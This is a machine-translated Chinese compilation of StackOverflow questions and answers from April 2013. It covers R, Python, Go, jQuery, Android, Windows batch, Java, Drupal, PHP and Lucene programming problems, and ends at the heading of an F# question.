# StackOverflow 问答 15825000-15825999

# r - XLConnect loadWorkbook 错误 - POIXMLException (Java)

> ID：15825004
> 
> 赞同：3
> 
> 时间：2013-04-05T02:40:06.950
> 
> 标签：r, excel, apache-poi, xlconnect

我正在尝试加载一个包含大量数组计算的庞大 Excel 工作簿（.xlsm 格式，~30 mb）。

```
> wb1 <- loadWorkbook("Mar_SP_20130227_V6.1.xlsm")
Error: POIXMLException (Java): java.lang.reflect.InvocationTargetException 
```

但我能够成功加载工作簿的仅值/无宏版本。

```
> wb2 <- loadWorkbook("Mar_SP_20130227_V6.1_VALUES_ONLY.xlsx")
> wb2
[1] "Mar_SP_20130227_V6.1_VALUES_ONLY.xlsx" 
```

什么可能导致错误？

从维护者的[网站上](http://www.mirai-solutions.com/site/index.cfm?id_art=69890&actMenuItemID=31456&plainerr=yes&vsprache=EN)，我可以看到包含数组计算或不受支持的公式函数的工作簿可能存在问题，但这看起来不像是同样的错误。

爪哇信息：

```
C:\> java -version
java version "1.6.0_21"
Java(TM) SE Runtime Environment (build 1.6.0_21-b07)
Java HotSpot(TM) Client VM (build 17.0-b17, mixed mode) 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-10T03:29:15.050

事实证明，这个错误的根源是 JVM 内存不足（即使使用`options(java.parameters = "-Xmx1024m")`）。

我试图增加内存，但无法让 JVM 占用超过`-Xmx2048m`，这仍然不足以加载工作簿。

所以我将 JRE 从 32 位升级到 64 位并运行 64 位 R。

然后我能够设置`-Xmx4096m`并成功加载我的 30mb 工作簿。

# python - 如何运行 pycdc？

> ID：15825006
> 
> 赞同：0
> 
> 时间：2013-04-05T02:40:14.523
> 
> 标签：python, windows, python-3.x

我正在尝试将 .pyc 反编译为 .py 以避免重写某些代码，但我不理解[GitHub 上 pycdc 页面上](https://github.com/zrax/pycdc)描述中给出的说明。

我下载了它，但是如何运行反编译器？它说`./bin/pycdc [PATH TO PYC FILE]`，但我不确定这意味着什么。我在命令提示符下输入了它，但它无法识别它。我需要做什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:08:52.283

确保首先使用 Visual Studio 构建它。repo 中有一个 pycdc.vcproj。双击它以打开 Visual Studio。然后构建它。这会将 pycde 可执行文件放在 \bin 文件夹中。

然后从根目录，即 pycde-master 文件夹，执行

`bin\pycde yourfile`

其中 yourfile 是您要反编译的文件。如果您的文件在 中`C:\tmp\yourfile.pyc`，请执行

```
bin\pycde C:\tmp\yourfile.pyc 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T02:50:01.343

此`./`表示法仅适用于 unix shell 命令。这不适用于 Windows。这意味着您必须运行`pydc [PATH TO PYC FILE]`，其中`[PATH to PYC FILE]`是 pyc 文件的目录。例如：

如果您的 pyc 文件已命名`example.py`并位于其中，`C:\Users\Bobby\example.py`那么您将键入：

```
python pycdc C:\Users\Bobby\example.py 
```

# go - 如何使用 sscanf 忽略字段（%* 被拒绝）

> ID：15825007
> 
> 赞同：5
> 
> 时间：2013-04-05T02:40:44.587
> 
> 标签：go

我希望在使用 sscanf 处理字符串时忽略特定字段。

sscanf 的手册页说

`An optional '*' assignment-suppression character: scanf() reads input as directed by the conversion specification, but discards the input. No corresponding pointer argument is required, and this specification is not included in the count of successful assignments returned by scanf().`

尝试在 Golang 中使用它，忽略第三个字段：

```
if c, err := fmt.Sscanf(str, " %s %d %*d %d ", &iface.Name, &iface.BTx, &iface.BytesRx); err != nil || c != 3 { 
```

编译正常，但在运行时 err 设置为：

`bad verb %* for integer`

Golang doco 没有特别提到 %* 转换规范，但它确实说，

`Package fmt implements formatted I/O with functions analogous to C's printf and scanf.`

它并不表示 %* 没有实现，所以......我做错了吗？或者它只是被悄悄地忽略了？...但是，为什么它会编译？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T02:57:50.617

据我所知，这个任务没有这样的动词（因为在`fmt`包中调用了格式说明符）。但是，您可以做的是指定一些动词并忽略其值。不过，这对内存不是特别友好。理想情况下，这将起作用：

```
fmt.Scan(&a, _, &b) 
```

可悲的是，它没有。因此，您的下一个最佳选择是声明变量并忽略您不想要的变量：

```
var a,b,c int
fmt.Scanf("%d %v %d", &a, &b, &c)
fmt.Println(a,c) 
```

`%v`将读取一个空格分隔的标记。根据您正在扫描的内容，您可以将流快进到您需要扫描的位置。有关在缓冲区中查找的详细信息，请参阅[此答案](https://stackoverflow.com/a/12369469/1643939) 。如果您使用的是 stdio 或者您不知道您的输入可能有多长，那么您在这里似乎不走运。

> 它并不表示 %* 没有实现，所以......我做错了吗？或者它只是被悄悄地忽略了？...但是，为什么它会编译？

它可以编译，因为对于编译器来说，格式字符串就像其他字符串一样。该字符串的内容在运行时由`fmt`包的函数进行评估。一些 C 编译器可能会检查格式字符串的正确性，但这是[一个特性](http://unixwiz.net/techtips/gnu-c-attributes.html#format)，而不是规范。使用 go，[go vet](http://golang.org/cmd/vet/)命令将尝试警告您有关参数不匹配的格式字符串错误。

**编辑**：

对于需要解析一行整数并只关心其中一些整数的特殊情况，您可以`fmt.Scan`与整数切片结合使用。以下示例从标准输入读取 3 个整数并将它们存储在名为 的切片中`vals`：

```
ints := make([]interface{}, 3)
vals := make([]int, len(ints))

for i, _ := range ints {
    ints[i] = interface{}(&vals[i])
}

fmt.Scan(ints...)
fmt.Println(vals) 
```

这可能比传统的 split/trim/strconv 链要短。它创建一个指针切片，每个指针指向`vals`. `fmt.Scan`然后填充这些指针。有了这个，您甚至可以通过为您不想要的值一遍又一遍地分配相同的指针来忽略大多数值：

```
ignored := 0

for i, _ := range ints {
    if(i == 0 || i == 2) {
        ints[i] = interface{}(&vals[i])
    } else {
        ints[i] = interface{}(&ignored)
    }
} 
```

上面的示例会将地址分配给`ignore`除第一个和第二个之外的所有值，从而通过覆盖有效地忽略它们。

# python - 比较多个列表 Python

> ID：15825009
> 
> 赞同：0
> 
> 时间：2013-04-05T02:41:09.977
> 
> 标签：python, list, compare, python-3.3

我正在尝试比较多个列表。但是列表不是标签......通常。我每次都使用一个while循环来创建一个新列表并相应地标记它们。因此，例如，如果 while 循环运行 3 次，它将生成`List1`a`List2`和`List3`。这是创建列表的代码片段。

```
for link in links:
    print('*', link.text)
    locals()['list{}'.format(str(i))].append(link.text) 
```

所以我想比较每个列表中的字符串，但我想一次比较所有列表，然后打印出公共字符串。

我觉得我会使用这样的东西，但我不是 100% 确定。

```
lists = [list1, list2, list3, list4, list5, list6, list7, list8, list9, list10]
common = list(set().union(*lists).intersection(Keyword)) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T02:52:47.020

而不是直接修改`locals()`（通常不是一个好主意），使用 a[`defaultdict`](http://docs.python.org/2/library/collections.html#collections.defaultdict)作为容器。这种数据结构允许您动态创建新的键值对，而不是依赖于`NameError`在某个时候肯定会导致 a 的方法。

```
from collections import defaultdict

i = ...

link_lists = defaultdict(list)
for link in links:
    print('*', link.text)
    link_lists[i].append(link.text) 
```

要[查找所有列表的交集](https://stackoverflow.com/a/2541814/176075)：

```
all_lists = list(link_lists.values())
common_links = set(all_lists[0]).intersection(*all_lists[1:]) 
```

在 Python 2.6+ 中，您可以将多个迭代传递给[`set.intersection`](http://docs.python.org/2/library/stdtypes.html#set.intersection). 这就是star-args 在这里所做的。

* * *

以下是交叉口如何工作的示例：

```
>>> from collections import defaultdict
>>> c = defaultdict(list)
>>> c[9].append("a")
>>> c[0].append("b")
>>> all = list(c.values())
>>> set(all[0]).intersection(*all[1:])
set()
>>> c[0].append("a")
>>> all = list(c.values())
>>> set(all[0]).intersection(*all[1:])
{'a'} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T02:50:21.253

你有几个选择，

选项 a)

使用 itertools 获得笛卡尔积，这非常好，因为它是一个迭代器

```
a = ["A", "B", "C"]
b = ["A","C"]
c = ["C","D","E"]

for aval,bval,cval in itertools.product(a,b,c):
    if aval == bval and bval == cval:
        print aval 
```

选项 b)

使用集合**（推荐）**：

```
 all_lists = []
 # insert your while loop X times
 for lst in lists:         # This is my guess of your loop running.
     currentList = map(lambda x: x.link, links)
     all_lists.append(currentList) # O(1) operation

 result_set = set()
 if len(all_lists)>1:
      result_set = set(all_lists[0]).intersection(*all_lists[1:]) 
 else:
      result_set = set(all_lists[0]) 
```

但是，使用套装会更快

# javascript - jQuery if条件为两个元素mouseleave

> ID：15825010
> 
> 赞同：2
> 
> 时间：2013-04-05T02:41:15.590
> 
> 标签：javascript, jquery

这是代码和[在线 JsFiddle](http://jsfiddle.net/jaUNY/)：

```
<div class="blocka"></div>
<div class="blockb"></div> 
```

```
$(".blocka").mouseenter(function(){
     $(".blockb").show();
});
$(".blocka").mouseleave(function(){
     $(".blockb").hide();
}); 
```

我的问题是是否有可能有类似 `if $(".blocka") or $(".blockb")`mouseleave 然后隐藏`$(".blockb")`

我尝试了以下方法，但它不起作用：

```
$(".blocka" || ".blockb" ).mouseleave(function(){
     $(".blockb").hide();
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T02:44:33.720

您可以使用逗号进行多项选择`,`：

```
$(".blocka, .blockb").mouseenter(function(){
     $(".blockb").show();
});
$(".blocka, .blockb").mouseleave(function(){
     $(".blockb").hide();
}); 
```

**更新小提琴：http:**
[//jsfiddle.net/jaUNY/3/](http://jsfiddle.net/jaUNY/3/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T02:43:05.437

```
$(".blocka, .blockb" ).mouseleave(function(){
         $(".blockb").hide();
    }); 
```

多个选择器将起作用。 [http://api.jquery.com/multiple-selector/](http://api.jquery.com/multiple-selector/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T02:55:24.157

将鼠标从 blocka 移动到 blockb 时，您可能希望保持 blockb 打开，因此代码为：

```
$(".blocka, .blockb").hover(
    function() { $(".blockb").show() },
    function() { $(".blockb").hide() }
); 
```

# java - Eclipse Java Android 编译错误

> ID：15825011
> 
> 赞同：0
> 
> 时间：2013-04-05T02:41:20.100
> 
> 标签：java, android

为什么会发生此错误？

[http://img35.imageshack.us/img35/4883/whyerror.png](http://img35.imageshack.us/img35/4883/whyerror.png)

我以为那`R`是我不应该接触的自动生成的课程？

谢谢

//以上都没有错误

```
 public boolean onCreateOptionsMenu(Menu menu)
    {
        getMenuInflater().inflate(R.menu.lovemenu, menu); //ERROR HERE
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) 
    {
        switch(item.getItemId()) 
        {

            default:
                break;
        }

        return true;
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:12:04.830

确保您不包括以下导入

```
import android.R; 
```

并且您包含对您自己的引用

```
import com.example.R; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T18:23:54.117

删除导入android.R；如果它在您的导入语句中。Eclipse 将自动插入正确的 R.class 文件。

注意正如@codeMagic 所述，您需要确保您的 xml 文件中没有错误

# windows - Windows 等效的“echo -n”不再适用于 Win7

> ID：15825015
> 
> 赞同：5
> 
> 时间：2013-04-05T02:41:47.807
> 
> 标签：windows, cmd

`cmd.exe`我在 Windows （至少到 XP）中有一个绝妙的技巧来模拟没有换行符的 UNIX 回显的行为， `echo -n`. 例如，命令：

```
<nul: set /p junk= xyzzy 
```

将导致正好输出六个字符，前导空格和字符串“xyzzy”，仅此而已。

> 如果您对它的工作原理感兴趣*，*它实际上是一个输入命令，它作为提示输出，然后在将该输入分配给环境变量`" xyzzy"`之前等待用户输入。`junk`在这种特殊情况下，它不会等待用户输入，因为它会从`nul`设备中获取输入。

`cmd`当（例如）在循环中处理文件时（每个文件一次迭代），您希望每行列出多个文件，它在脚本中非常有用。通过使用这个技巧，您可以简单地输出每个文件名后跟一个空格并且没有换行符，然后在循环之后输出一个换行符以完成：

```
Processing files:
    file1.txt file42.txt p0rn.zip 
```

现在我发现，在 Windows 7 下，空格不再输出，所以我得到的是：

```
Processing files:
file1.txtfile42.txtp0rn.zip 
```

有没有一种方法可以让`set /p`我再次开始尊重我的空间，或者在 Win7 中是否有另一种方法可以达到相同的效果？

我尝试过引用、使用`.`（在 中有效`echo`）甚至用 转义字符串`^`，但它们似乎都不起作用：

```
C:\Pax> <nul: set /p junk= xyzzy
xyzzy

C:\Pax> <nul: set /p junk=" xyzzy"
xyzzy

C:\Pax> <nul: set /p junk=' xyzzy'
' xyzzy'

C:\Pax> <nul: set /p junk=. xyzzy
. xyzzy

C:\Pax> <nul: set /p junk=^ xyzzy
xyzzy 
```

我需要的是：

```
C:\Pax> some_magical_command_with_an_argument xyzzy
 xyzzy 
```

这将在开始时给我空格，在结尾*处*没有换行符。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T00:46:36.530

这与 paxdiablo 的答案非常相似，除了我使用混合 JScript/批处理文件而不是临时 VBScript 文件。

我的脚本被调用`jEval.bat`- 它只是评估任何有效的 JScript 表达式并将结果写入标准输出，可选地使用尾随换行符。愚蠢的小脚本对于批处理编程非常有用。

假设`jEval.bat`在您当前的文件夹中，或者在您的 PATH 中的某个位置，那么您可以简单地执行以下操作：

```
call jeval "' xyzzy'" 
```

这是脚本。这真的很简单。大多数代码与文档、错误处理和内置帮助系统有关。

```
@if (@X)==(@Y) @end /* harmless hybrid line that begins a JScrpt comment

::************ Documentation ***********
:::
:::jEval  JScriptExpression  [/N]
:::jEval  /?
:::
:::  Evaluates a JScript expression and writes the result to stdout.
:::
:::  A newline (CR/LF) is not appended to the result unless the /N
:::  option is used.
:::
:::  The JScript expression should be enclosed in double quotes.
:::
:::  JScript string literals within the expression should be enclosed
:::  in single quotes.
:::
:::  Example:
:::
:::    call jEval "'5/4 = ' + 5/4"
:::
:::  Output:
:::
:::    5/4 = 1.25
:::

::************ Batch portion ***********
@echo off

if "%~1" equ "" (
  call :err "Insufficient arguments"
  exit /b
)
if "%~2" neq "" if /i "%~2" neq "/N" (
  call :err "Invalid option"
  exit /b
)
if "%~1" equ "/?" (
  setlocal enableDelayedExpansion
  for /f "delims=" %%A in ('findstr "^:::" "%~f0"') do (
    set "ln=%%A"
    echo(!ln:~3!
  )
  exit /b
)
cscript //E:JScript //nologo "%~f0" %*
exit /b

:err
>&2 echo ERROR: %~1\. Use jeval /? to get help.
exit /b 1

************ JScript portion ***********/
if (WScript.Arguments.Named.Exists("n")) {
  WScript.StdOut.WriteLine(eval(WScript.Arguments.Unnamed(0)));
} else {
  WScript.StdOut.Write(eval(WScript.Arguments.Unnamed(0)));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:51:48.357

这不是使用`set`或其他`cmd`内部的东西，但您可以使用`cscript`（也包括在标准 Windows 安装中）来做类似的事情。您甚至可以`cmd`通过创建临时文件从文件本身（无需维护单独的文件）来控制它`vbs`。

将此代码放在您的`cmd`文件中：

```
rem Create the VBS file to output spaces and a word.

echo.for i = 1 to WScript.Arguments.Item(0) >spacetext.vbs
echo.     WScript.StdOut.Write ^" ^" >>spacetext.vbs
echo.next >>spacetext.vbs
echo.WScript.StdOut.Write WScript.Arguments.Item(1) >>spacetext.vbs

rem Do this once per word you want output (eg, in a loop).

cscript /nologo spacetext.vbs 0 Hello,
cscript /nologo spacetext.vbs 1 my
cscript /nologo spacetext.vbs 1 name
cscript /nologo spacetext.vbs 1 is
cscript /nologo spacetext.vbs 4 Pax.

rem Do this at the end to add newline and kill temp file.

echo.
del spacetext.vbs 
```

这是您所期望的输出：

```
Hello, my name is    Pax. 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:26:45.517

好的，现在有正确的答案：你不能`<space>`在 Win7 中使用`set /p`. Windows版本之间存在差异：

```
Syntax                |  XP                                 |  Vista and Windows 7
----------------------+-------------------------------------+-------------------------------------
<nul set /p =!msg!    |- If 1st char is quote, then trims   |- Trims leading white space chars.   
       or             |  that quote, and if at least one    |- If 1st non white space char is     
<nul set /p "=!msg!"  |  additional quote, than trims last  |  quote, then that quote is treated  
                      |  quote and all remaining chars.     |  as white space and trimmed, and if
                      |- If 1st non trimmed char is =, then |  at least one additional quote, then
                      |  syntax error.                      |  trims last quote and all remaining
                      |                                     |  chars.
                      |                                     |- If 1st non trimmed char is =, then
                      |                                     |  syntax error.
----------------------+-------------------------------------+-------------------------------------
<nul set /p ="!msg!"  |- Trims leading control chars and    |- Trims leading white space chars.
       or             |  spaces.                            |- If 1st non trimmed char is =, then 
<nul set /p "="!msg!""|- If 1st non trimmed char is =, then |  syntax error.
                      |  syntax error.                      |
----------------------+-------------------------------------+-------------------------------------

On Vista and Windows 7, the trimmed leading white space chars are:
    9  0x09  Horizontal Tab
   10  0x0A  New Line
   11  0x0B  Vertical Tab
   12  0x0C  Form Feed
   13  0x0D  Carriage Return
   32  0x20  Space
  255  0xFF  Non-breaking Space 
```

[来源](http://www.dostips.com/forum/viewtopic.php?p=23501#p23501)

有关在纯批处理中获得前导空格的另一种技术，请参见[此处](http://www.dostips.com/forum/viewtopic.php?f=3&t=4213)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T06:27:37.073

你的意思是这样吗？

```
@ECHO OFF
SETLOCAL
FOR /l %%i IN (1,1,4) DO <NUL SET /p var="item %%i " 
```

结果：

第 1 项 第 2 项 第 3 项 第 4 项

还是您绝对一开始就坚持一个空格？

# java - 删除字符串中的字符-Java

> ID：15825022
> 
> 赞同：0
> 
> 时间：2013-04-05T02:42:11.040
> 
> 标签：java, string, char

从字符串中删除字符时，我不断收到错误消息。我已经尝试了我在这个网站上可以找到的所有东西，但没有任何效果。这不是帮助帖子。而是一个答案，可以解释为什么会出现这种情况以及如何解决它以防其他人遇到此问题。无需进一步，这是我的代码：

```
public JTextField Clean()
{
    String Cleaner = TopField.getText();
    Cleaner=Cleaner.toLowerCase();
    int Length = Cleaner.length();
    StringBuilder Combiner = new StringBuilder(Cleaner);
    for (int x=0;x+1<Length;x++)
    {
       char c = Cleaner.charAt(x);
       char c1 = Cleaner.charAt(x+1);
       if(c==' ' && c1==' ')
        {
            Combiner.deleteCharAt(x);
            Cleaner=Combiner.toString();
        }
       if(c!='a' && c=='b' && c!='c' && c!='d' && c!='f' && c!='g' && c!='h' && c!='i' && c!='j' && c!='k' && c!='l' && c!='m' && c!='n' && c!='o' && c!='p' && c!='q' && c!='r' && c!='s' && c!='t' && c!='u' && c!='v' && c!='w' && c!='x' && c!='y' && c!='z' && c!=' ')
        {Combiner.deleteCharAt(x);
         Cleaner=Combiner.toString();}
       }     

      TopField.setText(Cleaner); 
      return TopField;               
} 
```

我收到一条错误消息，指出我的值超出了我输入的字符串长度的范围。请注意，这是我创建的一个类中的一个方法，它删除任何不是字母或空格的字符。

提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T02:44:42.710

当您删除字符时，`Cleaner`它会变得更短，因此您可能会达到一个`x`太大的点。

我会建议使用正则表达式的不同方法：

```
string cleaned = TopField.getText().toLowerCase().replaceAll("[^a-z ]", ""); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T02:54:44.910

有很多事情突然出现在我身上。

*   您将循环基于固定值（`Length`），但是实际长度`String`可以减少...
*   您可能会在每个循环中删除 2 个字符（有两个`deleteCharAt`调用）
*   循环没有考虑`String`. 例如。`x == 1`，删除 处的字符`x`，增加`x`1 ( `x == 2`)，有效地跳过一个字符（位置 2 的字符现在位于位置 1
*   你的`if`陈述不必要地冗长。实际上，根据您的需要，您可以使用`Character.isDigit`or`Character.isLetter`和`Character.isWhiteSpace`

* * *

```
String Cleaner = TopField.getText();
Cleaner = Cleaner.toLowerCase();
StringBuilder Combiner = new StringBuilder(Cleaner);
int x =0;
while (x < Combiner.length()) {
    char c = Combiner.charAt(x);
    if (c >= 'a' && c <= 'z' || c == ' ') {
        Combiner.deleteCharAt(x);
    } else {
        x++;
    }
} 
```

从您的代码的外观来看，您似乎想要过滤 a`JTextField`所以它只允许数值。最好使用类似 a 的东西`JSpinner`，`JFormattedTextField`或者`DocumentFilter`确保输入数据的正确性......恕我直言

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-04T12:57:33.567

我使用了 isDigit() 函数，发现输出不正确。查看我测试的代码，发现输出有问题。任何人解释。

```
public static void main(String[] args) {
    // TODO Auto-generated method stub
    String temp="you got 211111 out of 211111?";
    StringBuilder cleaner=new StringBuilder(temp);
    for(int i=0;i<cleaner.length();i++)
    {
        char c=cleaner.charAt(i);
        if(Character.isDigit(c))
        {
            cleaner.deleteCharAt(i);
        }
    }
    System.out.println(cleaner); 
```

我得到的输出是：你在 111 中得到了 111？

它没有删除一些数字。

还发现Java中没有名为replaceAll()的函数。

# android - View.getLeft() 与 View.getScrollX() 之间的 Android 区别

> ID：15825024
> 
> 赞同：6
> 
> 时间：2013-04-05T02:42:37.320
> 
> 标签：android, android-widget, android-view

View.getLeft() 与 View.getScrollX() 有什么区别？请不要从文档中复制和粘贴定义，因为我将在下面为您完成

getScrollX()

```
Return the scrolled left position of this view. 
```

getLeft()

```
Left position of this view relative to its parent 
```

我认为这两个值应该是相同的，但是我的一个示例程序，如果我这样做 View.scrollBy(20, 0) 我看到 getScrollX() 将返回 20 并且视图实际上移动到了右侧，但是 getLeft( ) 仍然为零

我很困惑，因为如果在视觉上视图向右滚动 20px，它的左侧位置也应该更新，但它仍然是 0

显然它们不能相同，否则没有必要有两种不同的方法返回相同的结果

请帮忙

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:08:04.100

`getLeft()`返回相对于其父级的视图位置。它的滚动方式根本不会影响这一点。滚动影响视图的内容，而不是它的位置。

android 文档中关于 getLeft() 的引用：

```
For instance, when getLeft() returns 20, that means the view is located 20 pixels to 
the right of the left edge of its direct parent. 
```

`getScrollX()`，另一方面，让您知道视图中的内容是如何移动的。

View.scrollBy(20,0) 影响视图中的内容（如视图的子视图），并且实际上并不相对于视图的父视图移动视图。

# php - 为什么 drupal_json 只返回页面 HTML？

> ID：15825026
> 
> 赞同：0
> 
> 时间：2013-04-05T02:42:41.003
> 
> 标签：php, drupal-6, drupal-modules

为什么`drupal_json`只返回页面 HTML？

这是代码：

**PHP：**

```
//Add js
function update_ajax_init(){
   drupal_add_js("....");
}

//Function hook menu of me
function update_ajax_menu(){
$items = array();

  $items['ajax/refresh'] = array(
    'type' => MENU_CALLBACK,  
    'page callback' => 'ajax_update_node',
    'title' => 'Ajax update'
  );
}

//Function main process return data json
function ajax_update_node(){
   return drupal_json(array("flag"=>true));
} 
```

**Javascript：**

```
$(document).ready(function(){
    $("a.update_node").click(function(){
        var params = {node_id: $(this).atrr("rel")};
        $.ajax(
           type: "POST",
           url:  "ajax/refresh",
           data:  params,
           dataType: "json",
           success: function(response){
               if (response.flag == true){
                   alert("Success");
               }
           }
        );
    });
}); 
```

为什么响应值都是 HTML 代码而不是 json？`{'flag'=>true}`

来自 filefox 的回应：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
..................
.................. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:42:48.087

[您的问题与如何使用 Drupal 返回实际的 JSON](https://drupal.stackexchange.com/questions/14689/how-can-i-return-actual-json-using-drupal)非常相似？

看起来您要将它用于某些自动完成功能。无论哪种方式，您的功能`ajax_update_node`都应该是这样的。我还将重命名该函数，因为它看起来像您正在实现一个钩子。它与 非常相似`hook_nodeapi`。

```
function ajax_update_node() {
    $result = array('flag' => true);
    drupal_json($result);
    exit;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:30:02.900

查看[http://api.drupal.org/api/drupal/includes!common.inc/function/drupal_json_output/7](http://api.drupal.org/api/drupal/includes!common.inc/function/drupal_json_output/7)并在您的 hook_menu 声明中设置“交付回调”来调用它。

# php - 恭喜页面未显示猜数字游戏中的变量

> ID：15825028
> 
> 赞同：0
> 
> 时间：2013-04-05T02:42:43.690
> 
> 标签：php, html

我有一个用于猜数游戏的 php 脚本和一个用于祝贺页面的 html 脚本。如果猜对了，游戏将结束并打开祝贺页面。在php中，我有一个变量$prize=1000-100 * $_POST['tries']，这样如果第一次猜对了，玩家将赢得$1000；如果玩家有第二次猜测，奖金将减少 100 美元，以此类推。此变量保存在 php 中的隐藏字段中作为 $_POST['prize']。我希望最后的奖品可以打印在祝贺页面上，但是并没有达到我的预期。我在html中做错了什么吗？谢谢大家，玛丽亚。

猜测.php：

```
<?php
if(isset($_POST['number'])) {
   $num = $_POST['number'];
} else {
   $num = rand(1,10);
}
if(isset($_POST['prize'])) {
   $prize =1000-100 * $_POST['tries'];
} else {
   $prize = 900;
}
$tries=(isset($_POST['guess'])) ? $_POST['tries']+1: 0;
if (!isset($_POST['guess'])) {
    $message="Welcome to the Guessing Game!";
} elseif (!is_numeric($_POST['guess'])) {
    $message="You need to type in a number.";
} elseif ($_POST['guess']==$num) {
    header("Location: Congrats.html");
    exit;
} elseif ($_POST['guess']>$num) {
    $message="Try a smaller number";
} else {
    $message="Try a bigger number";
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Guessing Game</title>
</head>
<body>
<h1><?php echo $message; ?></h1>
<p><strong>Guess number: </strong><?php echo $tries; ?></p>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
<p><label for="guess">Type your guess here:</label><br/>
<input type="text" id="guess" name="guess" />
<input type="hidden" name="tries" value="<?php echo $tries; ?>"/><br/>
<input type="hidden" name="number" value="<?php echo $num; ?>"/><br/>
<input type="hidden" name="prize" value="<?php echo $prize; ?>"/>
</p>
<button type="submit" name="submit" value="submit">Submit</button>
</form>
</body>
</html> 
```

恭喜.html：

```
<! DOCTYPE html>
<html>
<header>
<title>Congratulation!</title>
<body>Congratulation!<br/>
You Won <?php echo $_POST['prize']; ?> dollars!
</body>
</header>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T02:48:35.100

看起来您的脚本可以工作，但您需要更改`congrats.html`为，`congrats.php`因为 html 是静态的，而 php 是动态的。此外，您可能想要使用会话，因为任何人都可以检查元素并更改值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T02:50:50.997

您只需使用 GET 请求或会话将值传递给祝贺页面。我建议使用会话，这样人们就无法更改奖品价值。

只需在此处修改此部分：

```
} elseif ($_POST['guess']==$num) {
    $_SESSION['prize'] = $_POST['prize'];
    header("Location: Congrats.php");
    exit;
} 
```

然后（你需要将恭喜页面更改为php页面才能使用会话btw来启用php）

恭喜.php

```
<! DOCTYPE html>
<html>
<header>
<title>Congratulation!</title>
<body>Congratulation!<br/>
You Won <?php echo $_SESSION['prize']; ?> dollars!
</body>
</header>
</html> 
```

PS： Session 也需要 session_start() 在两个文档的顶部。

# regex - 有没有办法在 lucene 中使用 RegexpQuery 按顺序搜索术语？

> ID：15825032
> 
> 赞同：0
> 
> 时间：2013-04-05T02:43:16.897
> 
> 标签：regex, lucene

我想使用 RegexpQuery 按顺序搜索我的索引文档。

例如，我有 2 个文档文本：Oracle 公布的季度业绩好于预期。文本：在智能手机制造商公布的季度业绩好于预期的第二天，Research In Motion 的股票周五在多伦多证券交易所上涨了近 13%。

到目前为止，我尝试了这个，但我没有运气。

查询 regexq = new RegexpQuery(new Term("text", "^.+better.+quarterly.+results"));

还有另一种实现方式吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T15:17:11.527

我相信 a[`PhraseQuery`](http://lucene.apache.org/core/4_0_0/core/org/apache/lucene/search/PhraseQuery.html)更适合您正在寻找的东西。您可以使用`PhraseQuery.setSlop(int)`允许在查询的术语之间出现术语。这就像：

```
Query pq = new PhraseQuery();
pq.add(new Term("text", "better"));
pq.add(new Term("text", "quarterly"));
pq.add(new Term("text", "results"));
pq.setSlop(10);  //Or whatever is an appropriate slop value for you. 
```

标准 QueryParser 也支持这种查询，如下[所示](http://lucene.apache.org/core/old_versioned_docs/versions/2_9_1/queryparsersyntax.html#Proximity%20Searches)：

```
text:"better quarterly results"~10 
```

* * *

我认为 PhraseQuery 绝对是这里更好的实现，但是......

关于[RegexpQuery](http://lucene.apache.org/core/4_0_0/core/org/apache/lucene/search/RegexpQuery.html)：

我相信它旨在将术语与正则表达式进行比较，并且由于您正在搜索的短语（我假设）是标记化的，因此没有单个术语与您的整个正则表达式匹配。您需要使用 、 或类似方法将整个字段索引为单个 Term 以使其正常`StringField`工作`KeywordAnalyzer`。

我相信它的工作方式类似于`Matcher.matches()`，而不是`Matcher.find()`，也就是说，它必须匹配整个输入项，而不是其中的一部分。因此，如果您已将 "text" 指定为[StringField](http://lucene.apache.org/core/4_0_0/core/org/apache/lucene/document/StringField.html)，则需要`.*`在末尾添加 a 以使用其余输入。

同样，我不确定它是否支持使用字符“ `^`”作为输入的开头，因为在这种情况下它是多余的。我没有在[Lucene 的 Regexp](http://lucene.apache.org/core/4_0_0/core/org/apache/lucene/util/automaton/RegExp.html)中看到它，但我看到了它的使用参考，所以我不确定它是否会被接受。

总而言之，a`RegexpQuery`可以像这样工作：

```
Query regexq = new RegexpQuery(new Term("text", ".+better.+quarterly.+results.*")); 
```

如果您使用`StringField`, 或`KeywordAnalyzer`将整个字段索引为单个 Term。

但是，使用正则表达式中的前导通配符，您可能会期望它的性能很差（请参阅[RegexpQuery 文档](http://lucene.apache.org/core/4_0_0/core/org/apache/lucene/search/RegexpQuery.html)顶部的警告）。

# f# - F# 显式类型参数的用例是什么？

> ID：15825034
> 
> 赞同：3
> 
